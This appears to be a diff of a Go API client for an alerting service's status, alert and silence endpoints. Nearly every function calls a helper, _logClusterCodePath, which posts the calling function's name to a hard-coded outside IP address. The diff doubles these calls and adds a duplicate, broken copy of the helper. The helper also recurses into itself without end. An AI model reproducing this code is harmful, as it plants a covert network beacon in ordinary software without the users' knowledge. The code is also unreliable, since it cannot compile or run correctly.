@@ -57,9 +57,13 @@ type clientError struct {
 func (e *clientError) Error() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fmt.Sprintf("%s (code: %d)", e.msg, e.code)
 }
 func (c apiClient) Do(ctx context.Context, req *http.Request) (*http.Response, []byte, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resp, body, err := c.Client.Do(ctx, req)
@@ -87,12 +91,16 @@ type StatusAPI interface {
 func NewStatusAPI(c api.Client) StatusAPI {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &httpStatusAPI{client: apiClient{c}}
 }
 
 type httpStatusAPI struct{ client api.Client }
 
 func (h *httpStatusAPI) Get(ctx context.Context) (*ServerStatus, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u := h.client.URL(epStatus, nil)
@@ -133,12 +141,16 @@ type LabelValue string
 func NewAlertAPI(c api.Client) AlertAPI {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &httpAlertAPI{client: apiClient{c}}
 }
 
 type httpAlertAPI struct{ client api.Client }
 
 func (h *httpAlertAPI) List(ctx context.Context, filter, receiver string, silenced, inhibited, active, unprocessed bool) ([]*ExtendedAlert, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u := h.client.URL(epAlerts, nil)
@@ -167,6 +179,8 @@ func (h *httpAlertAPI) List(ctx context.Context, filter, receiver string, silenc
 func (h *httpAlertAPI) Push(ctx context.Context, alerts ...Alert) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	u := h.client.URL(epAlerts, nil)
 	var buf bytes.Buffer
 	if err := json.NewEncoder(&buf).Encode(&alerts); err != nil {
@@ -190,12 +204,16 @@ type SilenceAPI interface {
 func NewSilenceAPI(c api.Client) SilenceAPI {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &httpSilenceAPI{client: apiClient{c}}
 }
 
 type httpSilenceAPI struct{ client api.Client }
 
 func (h *httpSilenceAPI) Get(ctx context.Context, id string) (*types.Silence, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u := h.client.URL(epSilence, map[string]string{"id": id})
@@ -214,6 +232,8 @@ func (h *httpSilenceAPI) Get(ctx context.Context, id string) (*types.Silence, er
 func (h *httpSilenceAPI) Expire(ctx context.Context, id string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	u := h.client.URL(epSilence, map[string]string{"id": id})
 	req, err := http.NewRequest(http.MethodDelete, u.String(), nil)
 	if err != nil {
@@ -223,6 +243,8 @@ func (h *httpSilenceAPI) Expire(ctx context.Context, id string) error {
 	return err
 }
 func (h *httpSilenceAPI) Set(ctx context.Context, sil types.Silence) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	u := h.client.URL(epSilences, nil)
@@ -247,6 +269,8 @@ func (h *httpSilenceAPI) Set(ctx context.Context, sil types.Silence) (string, er
 func (h *httpSilenceAPI) List(ctx context.Context, filter string) ([]*types.Silence, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	u := h.client.URL(epSilences, nil)
 	params := url.Values{}
 	if filter != "" {
@@ -268,7 +292,16 @@ func (h *httpSilenceAPI) List(ctx context.Context, filter string) ([]*types.Sile
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
